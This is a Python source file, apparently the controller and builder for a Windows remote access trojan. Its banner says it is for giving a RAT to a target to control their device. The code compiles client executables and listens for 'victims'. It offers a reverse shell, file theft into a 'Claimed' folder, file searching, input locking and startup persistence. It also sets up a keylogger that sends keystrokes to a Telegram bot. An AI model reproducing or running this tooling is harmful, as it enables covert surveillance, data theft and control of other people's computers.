import os
import colorama
import time
import json
from socket import *
import psutil
import threading
import shutil

class screen :
    
    def clear () :
        os.system ('cls')

    def Banner () :
         print (colorama.Fore.GREEN+"""
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u             ________________ Programmer Contact _________________
        u$$$$$$$$$$$$$$$$$$$$$$$u           |                                                     |
       u$$$$$$$$$$$$$$$$$$$$$$$$$u          |                                                     |
       u$$$$$$$$$$$$$$$$$$$$$$$$$u          |                                                     |
       u$$$$$$"   "$$$"   "$$$$$$u          |           Instagram : It's not ready yet!!          |               
       "$$$$"      u$u       $$$$"          |                                                     |
        $$$u       u$u       u$$$           |       Github : https://github.com/alphashadow02     |
        $$$u      u$$$u      u$$$           |                                                     |
         "$$$$uu$$$   $$$uu$$$$"            |            Youtube : It's not ready yet!!           | 
          "$$$$$$$"   "$$$$$$$"             |                                                     |
            u$$$$$$$u$$$$$$$u               |            Linkdin : It's not ready yet!!           |
             u$"$"$"$"$"$"$u                |                                                     |
  uuu        $$u$ $ $ $ $u$$       uuu      |               Telegram : @Alphashadow02             |
 u$$$$        $$$$$u$u$u$$$       u$$$$     |                                                     |
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$     |                                                     |
u$$$$$$$$$$$uu    ""'""    uuuu$$$$$$$$$$   |__________________ About this shit __________________|
$$$$"'"$$$$$$$$$$uuu   uu$$$$$$$$$"'"$$$"   |                                                     |
 "'"      ""$$$$$$$$$$$uu ""$"'"            |       Hey man , with this shit you can make a       |
           uuuu ""$$$$$$$$$$uuu             |                     Windows RAT!                    |
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$    |                   Give it to target                 |
  $$$$$$$$$$""'"           ""$$$$$$$$$$$"   |             And Control target's Device!!!          |
   "$$$$$"                      ""$$$$""    |_____________________________________________________|
     $$$"                         $$$$\n\n""")


    def client_bar (cli_tedad , status) :
            print (colorama.Fore.RED + f"""\n
            Clients : {cli_tedad}       *********    Remote Access Control    *********         Status Server : {status}""")
            print ("              Clients : " + str(client_address))
            time.sleep (1)







class ability :
     


     

     
     def send_message (client) :
          screen.clear ()
          screen.Banner ()
          print (colorama.Fore.RED + '\n  ***************Send Message as Message Box!!***************')
          while True :
            inp = input ('Message > : ')
            if inp == 'q' :
                 client.send ('q'.encode())
                 control.control_button (client)
                 
            client.sendall (inp.encode ())
            result = client.recv (123456).decode ()
            print (result)




     def reverse_shell (client) :
          screen.clear ()
          screen.Banner ()
          while True :
                shell_path = client.recv (1233445).decode ()
                shell = input (shell_path)
                if shell == None or shell == "" or shell == '\n' :
                    client.sendall ("-".encode ())
                    continue
                elif shell == 'cls' :
                    screen.clear ()
                    screen.Banner ()
                    client.sendall ("-".encode ())
                    continue
                elif shell == 'q' :
                    client.send ('q'.encode ())
                    control.control_button (client)
                client.sendall (shell.encode ())
                data = client.recv (12341234).decode ()
                print (data +'\n')



class Transfering :
     
     def upload(client, save_path, path, name):
          client.send(save_path.encode())  
          client.send(name.encode())  
    
          try:
               with open(path, 'rb') as f:
                    while True:
                         l = f.read(1024)
                         if not l: 
                              break
                         client.send(l)
        
               client.send(b'END')  
               print(colorama.Fore.GREEN + 'File Transfer is Completed!!')
               input('Press Enter to Continue...')
               control.control_button(client)  

          except FileNotFoundError:
               print(colorama.Fore.RED + "Error: File not found!")
               input ('\nPress Enter to Continue...')
               control.control_button (client)
          
     

     def download(client, path, name):
          client.send(path.encode())
          if not os.path.exists("Claimed"):
               os.makedirs("Claimed")
    
          with open(f'Claimed/{name}', 'wb') as f:
               while True:
                    l = client.recv(1024)
                    if l == b'END':  
                         print('\n[+] Done')
                         print('\n[+] You can Find Downloaded File in Claimed Folder!')
                         input('Press Enter To Continue...')
                         control.control_button(client)
                         break  
                    f.write(l)
          






class control :
     def control_menu () :
            print (colorama.Fore.GREEN + """
[01]Set Client Control :                    [03]Check Victims Status :

[02]Set All Clients Control :               [04]Exit :""")


     def control_button (client) :
          while True :
            print (colorama.Fore.YELLOW + """\n
[1] Send Message :                     [10] Clean Victim's Hard XD : 
[2] Reverse Shell > :                  [11] Kill Tasks :
[3] Change Background :                [12] 
[4] Download and Uploading :           [13] 
[5] Searching Files :                  [14] 
[6] Lock Keyboard & Mouse :            [15] 
[7] System Info :                 
[8] Set Auto Startup :
[9] Set a Keylogger :           
                   
[0] For Exit or Enter (q) :

""")
            inp = input ('==> ')
            if inp == '1' :
                 client.sendall (inp.encode ())
                 ability.send_message (client)
            elif inp == '2' :
                 client.sendall (inp.encode ())
                 ability.reverse_shell (client)
            elif inp == '3' :
                 client.sendall (inp.encode ("utf-8"))
                 screen.clear ()
                 screen.Banner ()
                 print (colorama.Fore.RED + '\n*******Select Wallpaper*******')
                 print (colorama.Fore.GREEN + '\n\n[1] Red Hacked :')
                 print ('[2] Open Image :')
                 inp1 = input ('\n\n==> ')
                 if inp1 == '1' :
                      client.sendall ("https://static.vecteezy.com/system/resources/previews/014/292/672/non_2x/system-hacked-alert-with-digital-binary-code-background-vector.jpg".encode ('utf-8'))
                      client.send ('hacked_red.jpg'.encode ("utf-8"))
                      result = client.recv (1024).decode ("utf-8")
                      print (result)
                      input ('Press Enter To Continue...')
                      continue

                 elif inp1 == 2 :
                      path = input ('\nImage URL > : ')
                      save_name = input ('File Name > :')
                      client.sendall (path.encode ('utf-8'))
                      client.send (save_name.encode ('utf-8'))
                      result = client.recv (1024).decode ('utf-8')
                      print (result)
                      input ('Press Enter To Continue...')
                      continue





            elif inp == '4' :
                 client.sendall (inp.encode ())
                 screen.clear ()
                 screen.Banner ()
                 print (colorama.Fore.YELLOW +'\n[+] Choose an option :')
                 print (colorama.Fore.CYAN + '\n\n[1] Download File :')
                 print (colorama.Fore.CYAN + '[2] Upload File')
                 inp1 = input ('\n\n==> ')
                 if inp1 == '1' :
                      client.send ('down'.encode ('utf-8'))
                      screen.clear ()
                      screen.Banner ()
                      print (colorama.Fore.CYAN + '\nEnter the path of file that you download it :')
                      path_down = input ("\n==> ")
                      print ("\nEnter the name that you want save file :")
                      name_down = input ("\n==> ")
                      Transfering.download (client , path_down , name_down)
                      control.control_button (client)


                 elif inp == '2' :
                      client.send ('up'.encode ('utf-8'))
                      path_file = input (colorama.Fore.CYAN + '\nEnter Path of File : ')
                      name_file = input (colorama.Fore.CYAN + "\nEnter the path of that you want to save file : ")
                      name = input ('\nEnter the name that you want to save')
                      Transfering.upload (client , name_file , path_file , name)
                      control.control_button (client)

                      




            elif inp == '5' :
                 client.sendall (inp.encode ())
                 part_list = []
                 while True :
                      part = client.recv (2048).decode ('utf-8')
                      if part == '-' :
                           break
                      part_list.append (part)
                 counter = 0
                 for a in part_list :
                      print (f'[{counter}] {a}')
                      counter+=1
                 select_part = input ('\nNumber of Partiotn > : ')
                 try:
                    select_part1 = int(select_part)
                    if select_part1 < 0 or select_part1 >= len(part_list):
                         raise ValueError("Invalid partition number.")
                 except ValueError as e:
                    print(f"Invalid input: {e}")
                    exit(1)
                 client.send(str(select_part1).encode ('utf-8'))
                 result1 = client.recv (8192).decode ('utf-8')
                 if result1 == '+' :
                      screen.clear ()
                      screen.Banner ()
                      print (colorama.Fore.GREEN + (f'\nPartition Drive > : {part_list[select_part1]}'))
                      print ('\n                     Enter the name of file that you searching for...\n                       For example : name.extension > a.txt')
                      while True :
                         input1 = input ('\n==> ')
                         if input1 == 'q' :
                              client.send ('q'.encode ('utf-8'))
                              control.control_button (client)
                              break
                         client.send (input1.encode ('utf-8'))
                         main_result = client.recv (8192).decode ('utf-8')
                         print (main_result)

            elif inp == '6' :
                 client.sendall (inp.encode ())
                 screen.clear()
                 screen.Banner ()
                 print (colorama.Fore.YELLOW + '\n[01] Lock Device :')
                 print ('[02] Unlock Device :')
                 inp_lock = input ('\n==> ')

                 
                 if inp_lock == '01' or inp_lock == '1' :
                      client.send ('LOCK'.encode ('utf-8'))
                      lock_result = client.recv (2048).decode ('utf-8')
                      print (colorama.Fore.GREEN + lock_result)
                      input (colorama.Fore.CYAN + 'Press Enter to Continue...')
                      continue

                 
                 elif inp_lock == '02' or inp_lock == '2' :
                      client.send ('UNLOCK'.encode ('utf-8'))
                      lock_result = client.recv (2048).decode ('utf-8')
                      print (colorama.Fore.GREEN + lock_result)
                      input (colorama.Fore.CYAN +'Press Enter To Continue...')
                      continue

                 
                 else :
                      client.send ('-'.encode ('utf-8'))
                      print ('Invalid Option !')
                      input (colorama.Fore.CYAN +'Press Enter To Continue...')
                      continue


                 
            elif inp == '7' :
                 client.sendall (inp.encode ())
                 screen.clear ()
                 screen.Banner ()
                 data = client.recv(2048).decode('utf-8')
                 system_info = json.loads(data)
                 print(f"System: {system_info.get('system')}")
                 print(f"Node Name: {system_info.get('node_name')}")
                 print(f"Release: {system_info.get('release')}")
                 print(f"Version: {system_info.get('version')}")
                 print(f"Machine: {system_info.get('machine')}")
                 input('\nPress Enter To Continue...')
                 continue
            elif inp == '8' :
                 screen.clear ()
                 screen.Banner ()
                 ans = input ('\n[+] Are you sure to set client app to startup? [yes/no] : ')
                 if ans == 'yes' or ans == 'y' :
                    client.sendall (inp.encode ())
                    continue
                 continue
                 
            elif inp == '9' :
                 client.sendall (inp.encode ())
                 screen.clear ()
                 screen.Banner ()
                 print (colorama.Fore.GREEN + "\nThe Keylogger use telegram bot to send data for better performance !\nEnter ther bot tokken and chat id to set keylogger ->")
                 print (colorama.Fore.YELLOW + '\n\n                                            Token :')
                 token = input ('\n                                         ==> ')
                 print ('\n\n                                            Chat-ID :')
                 chatid = input ('\n                                         ==> ')
                 client.send (token.encode ("utf-8"))
                 client.send (chatid.encode ("utf-8"))
                 reult_logger = client.recv (4196).decode ("utf-8")
                 print (colorama.Fore.CYAN + reult_logger)
                 input ("\nPress Enter to Continue...")
                 continue
      
            elif inp == '0' or inp == 'q' :
                 break
            else :
                 print (colorama.Fore.RED + 'Ivalid Option!!')
                 input ('Press Enter to Continue...')
                 continue

        
     def remote_control (cli_tedad , status) :
            screen.clear ()
            screen.Banner ()
            screen.client_bar (cli_tedad , status)
            control.control_menu ()
            inp = input ('\n==> ')
            if inp == '01' or inp == '1' :

                screen.clear ()
                screen.Banner ()
                print (client_address)
                counter = 0
                print ('\n       Victims :\n')
                for i in client_address :
                    print (colorama.Fore.CYAN + f'\n           [{counter}] {client_address}')
                    counter += 1
                print (colorama.Fore.GREEN + 'Enter the Number : ')
                client = input ('==> ')
                cli = client_list[int(client)]
                control.control_button (cli)
                control.remote_control (cli_tedad , status)

            elif inp == '02' or inp == '2' :
                pass

            elif inp == '03' or inp == '3' :
                pass
    
            elif inp == '04' or inp == '4' or inp == 'q' :
                start ()

            else :
                control.remote_control (cli_tedad , status)








class Server :
      

      def server (ip , port) :
            s = socket (AF_INET , SOCK_STREAM)
            s.bind ((f'{ip}' , int(port)))
            s.setsockopt (SOL_SOCKET , SO_REUSEADDR , 1)
            print (colorama.Fore.RED + '\nStarting Server...')
            s.listen ()
            time.sleep (1)
            print (colorama.Fore.GREEN + f'\nServer Start Running On Port : {port}')
            ind = 0
            while True :
                c , addr = s.accept ()
                if ind == 0 :
                    client_list[ind] = c
                    client_address.append (addr)
                    ind+=1
                    continue
                client_list.append (c)
                client_address.append (addr)
        
      def exist_cli () :
                if len(client_address) > 0 :
                    screen.clear ()
                    screen.Banner ()
                    tedad = len (client_address)
                    screen.client_bar (tedad , 'Good')
                    control.remote_control (tedad , 'good')
                else :
                    print ('Waiting for Victims...')
                    time.sleep (5)
                    Server.exist_cli ()







class file_creator:

    def cliapp(ip, new_port):

        with open('./bin/template/template.py', 'r', encoding='utf-8') as file:
            app = file.read()

        # جایگزینی IP
        app = app.replace(
            "hostid = '192.168.100.25'",
            f"hostid = '{ip}'"
        )

        # جایگزینی Port
        app = app.replace(
            "port = '4545'",
            f"port = '{new_port}'"
        )
        return app

    def Client(name, ip, port):
        os.system(f'mkdir temp\\{name}')

        app = file_creator.cliapp(ip, port)

        cli = open(f'temp\\{name}\\{name}.py', 'w+', encoding='utf-8')

        cli.write(app)

        cli.close()
        os.system(f'pyinstaller --onefile ./temp/{name}/{name}.py')
        
       








def start () :
    while True :
        screen.clear ()
        screen.Banner ()
        print (colorama.Fore.GREEN + "**********   Lets Get Start It   **********\n")
        print (colorama.Fore.YELLOW + "[01]" + colorama.Fore.CYAN + "Start Server :")
        print (colorama.Fore.YELLOW + "[02]" + colorama.Fore.CYAN + "Builder :")
        print (colorama.Fore.RED + "\n\n[03]" + colorama.Fore.RED +"EXIT :")
        inp = input (colorama.Fore.GREEN + "\n\n==> ")
        if inp == '02' or inp == '2' :
            screen.clear ()
            screen.Banner ()
            print (colorama.Fore.RED + "**********   Create a Client RAT   **********\n")
            print (colorama.Fore.GREEN + "Create a Name :")
            name = input (colorama.Fore.GREEN + "\n==> ")
            screen.clear ()
            screen.Banner ()
            print (colorama.Fore.RED + "**********   Create a Client RAT   **********\n")
            ip = input (colorama.Fore.GREEN + "Enter Host IP : ")
            port = input (colorama.Fore.GREEN + "\nEnter Host Port : ")
            print (colorama.Fore.RED + "\nCreating RAT...")
            time.sleep (3)
            print (colorama.Fore.RED + "\nPlease Wait a few Seccond ...")
            time.sleep (5)
            file_creator.Client (name , ip , port)
            print (colorama.Fore.GREEN + '\n\n[+] The Rat has created as sucsessfully!!')
            print (colorama.Fore.CYAN + f"\n[+]App Directory : /root/dist/{name}.exe")
            os.remove(f"./{name}.spec")
            input (colorama.Fore.WHITE + "\n\nPress Enter To Continue...")
            start ()

        elif inp == '01' or inp == '1' :
            screen.clear ()
            screen.Banner ()
            time.sleep (2)
            print (colorama.Fore.RED + "**********   Starting Server   **********\n")
            time.sleep (1)
            ip = input (colorama.Fore.GREEN + "\n\nServer IP ==> ")
            port = input (colorama.Fore.GREEN + "\nServer PORT ==> ")
            server_task = threading.Thread (target=Server.server  , args=(ip , port)).start ()
            time.sleep (1.5)
            input ('\nPress Enter to Continue...')
            Server.exist_cli ()


        elif inp == "03" or inp =="3" :
             break 
          
               







client_list = [None]
client_address = []


start ()

